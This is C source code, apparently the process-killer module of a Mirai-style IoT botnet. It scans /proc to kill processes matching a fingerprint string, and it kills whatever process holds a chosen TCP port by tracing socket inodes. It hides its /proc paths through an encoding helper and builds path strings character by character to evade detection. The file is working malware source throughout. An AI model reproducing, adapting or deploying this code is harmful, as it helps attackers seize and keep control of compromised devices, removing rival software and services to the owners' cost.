#ifdef DEBUG
#include <stdio.h>
#endif

#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <fcntl.h>
#include <dirent.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <linux/limits.h>
#include <sys/prctl.h>
#include <arpa/inet.h>

#include "util.h"
#include "killer.h"
#include "encode.h"

int killer_pid = -1;

static char mem_exists(char *buf, int buf_len, char *str, int str_len)
{
    int matches = 0;

    if (str_len > buf_len)
        return 0;

    while (buf_len--)
    {
        if (*buf++ == str[matches])
        {
            if (++matches == str_len)
                return 1;
        }
        else
            matches = 0;
    }

    return 0;
}

static char search_file(char *path, char *findbuf)
{
    int fd, ret;
    char rdbuf[4096];
    char found = 0;

    if ((fd = open(path, O_RDONLY)) == -1)
        return 0;

    while ((ret = read(fd, rdbuf, sizeof (rdbuf))) > 0)
    {
        if (mem_exists(rdbuf, ret, findbuf, util_strlen(findbuf)))
        {
            found = 1;
            break;
        }
    }

    close(fd);
    return found;
}

void killer_init(char *filebuf, char *searchbuf)
{
    DIR *dir;
    struct dirent *file;
    char procfs[16];

    killer_pid = fork();
    if (killer_pid > 0 || killer_pid == -1)
        return;

    enc_retrive(ENC_KILLER_PROCFS, procfs);
    if ((dir = opendir(procfs)) == NULL)
    {
#ifdef DEBUG
        printf("[killer] failed to open /proc/\n");
#endif
        util_memset(procfs, 0, sizeof(procfs));
        exit(0);
    }

#ifdef DEBUG
    printf("[killer] searching all %s files for %s\n", filebuf, searchbuf);
#endif

    while ((file = readdir(dir)) != NULL)
    {
        if (*(file->d_name) < '0' || *(file->d_name) > '9')
            continue;

        char path[128];
        int fd, pid = atoi(file->d_name);

        util_strcpy(path, procfs);
        util_strcat(path, file->d_name);
        util_strcat(path, filebuf);

        if (search_file(path, searchbuf))
        {
#ifdef DEBUG
            printf("[killer] found fingerprint killing process %d\n", pid);
#else
            kill(pid, 9);
#endif
        } 

        util_memset(path, 0, sizeof (path));
    }

#ifdef DEBUG
    printf("[killer] finnished scanning device\n");
#endif

    util_memset(procfs, 0, sizeof(procfs));
    closedir(dir);
    exit(0);
}


char killer_kill_by_port(uint16_t port)
{
    DIR *dir, *fd_dir;
    struct dirent *entry, *fd_entry;
    char path[PATH_MAX] = {0}, exe[PATH_MAX] = {0}, buffer[513] = {0};
    int pid = 0, fd = 0;
    char inode[16] = {0};
    char *ptr_path = path;
    int ret = 0;
    char port_str[16];

#ifdef DEBUG
    printf("[killer] Finding and killing processes holding port %d\n", ntohs(port));
#endif

    util_itoa(ntohs(port), 16, port_str);
    if (util_strlen(port_str) == 2)
    {
        port_str[2] = port_str[0];
        port_str[3] = port_str[1];
        port_str[4] = 0;

        port_str[0] = '0';
        port_str[1] = '0';
    }

    char procnet[32];
    enc_retrive(ENC_KILLER_PROCNET, procnet);

    fd = open(procnet, O_RDONLY);
    if (fd == -1)
    {
        util_memset(procnet, 0, sizeof(procnet));
        return 0;
    }
    util_memset(procnet, 0, sizeof(procnet));

    while (util_fdgets(buffer, 512, fd) != NULL)
    {
        int i = 0, ii = 0;

        while (buffer[i] != 0 && buffer[i] != ':')
            i++;

        if (buffer[i] == 0) continue;
        i += 2;
        ii = i;

        while (buffer[i] != 0 && buffer[i] != ' ')
            i++;

        buffer[i++] = 0;
        if (util_stristr(&(buffer[ii]), util_strlen(&(buffer[ii])), port_str) != -1)
        {
            int column_index = 0;
            char in_column = 0;
            char listening_state = 0;

            while (column_index < 7 && buffer[++i] != 0)
            {
                if (buffer[i] == ' ' || buffer[i] == '\t')
                    in_column = 1;
                else
                {
                    if (in_column == 1)
                        column_index++;

                    if (in_column == 1 && column_index == 1 && buffer[i + 1] == 'A')
                    {
                        listening_state = 1;
                    }

                    in_column = 0;
                }
            }
            ii = i;

            if (listening_state == 0)
                continue;

            while (buffer[i] != 0 && buffer[i] != ' ')
                i++;
            buffer[i++] = 0;

            if (util_strlen(&(buffer[ii])) > 15)
                continue;

            util_strcpy(inode, &(buffer[ii]));
            break;
        }
    }
    close(fd);

    if (util_strlen(inode) == 0)
    {
#ifdef DEBUG
        printf("Failed to find inode for port %d\n", ntohs(port));
#endif
        return 0;
    }

#ifdef DEBUG
    printf("Found inode \"%s\" for port %d\n", inode, ntohs(port));
#endif

    char procfs[8];
    enc_retrive(ENC_KILLER_PROCFS, procfs);

    if ((dir = opendir(procfs)) != NULL)
    {
        while ((entry = readdir(dir)) != NULL && ret == 0)
        {
            char *pid = entry->d_name;

            if (*pid < '0' || *pid > '9')
                continue;

            util_strcpy(ptr_path, procfs);
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), "/");
            util_strcpy(ptr_path + util_strlen(ptr_path), "e");
            util_strcpy(ptr_path + util_strlen(ptr_path), "x");
            util_strcpy(ptr_path + util_strlen(ptr_path), "e");

            if (readlink(path, exe, PATH_MAX) == -1)
                continue;

            util_strcpy(ptr_path, procfs);
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), "/");
            util_strcpy(ptr_path + util_strlen(ptr_path), "f");
            util_strcpy(ptr_path + util_strlen(ptr_path), "d");

            if ((fd_dir = opendir(path)) != NULL)
            {
                while ((fd_entry = readdir(fd_dir)) != NULL && ret == 0)
                {
                    char *fd_str = fd_entry->d_name;

                    util_memset(exe, 0, PATH_MAX);
                    util_strcpy(ptr_path, procfs);
                    util_strcpy(ptr_path + util_strlen(ptr_path), pid);
                    util_strcpy(ptr_path + util_strlen(ptr_path), "/");
                    util_strcpy(ptr_path + util_strlen(ptr_path), "f");
                    util_strcpy(ptr_path + util_strlen(ptr_path), "d");
                    util_strcpy(ptr_path + util_strlen(ptr_path), "/");
                    util_strcpy(ptr_path + util_strlen(ptr_path), fd_str);
                    if (readlink(path, exe, PATH_MAX) == -1)
                        continue;

                    if (util_stristr(exe, util_strlen(exe), inode) != -1)
                    {
                        kill(util_atoi(pid, 10), 9);
                        ret = 1;
                    }
                }
                closedir(fd_dir);
            }
        }
        closedir(dir);
    }

    util_memset(procfs, 0, sizeof(procfs));
    sleep(1);
    return ret;
}
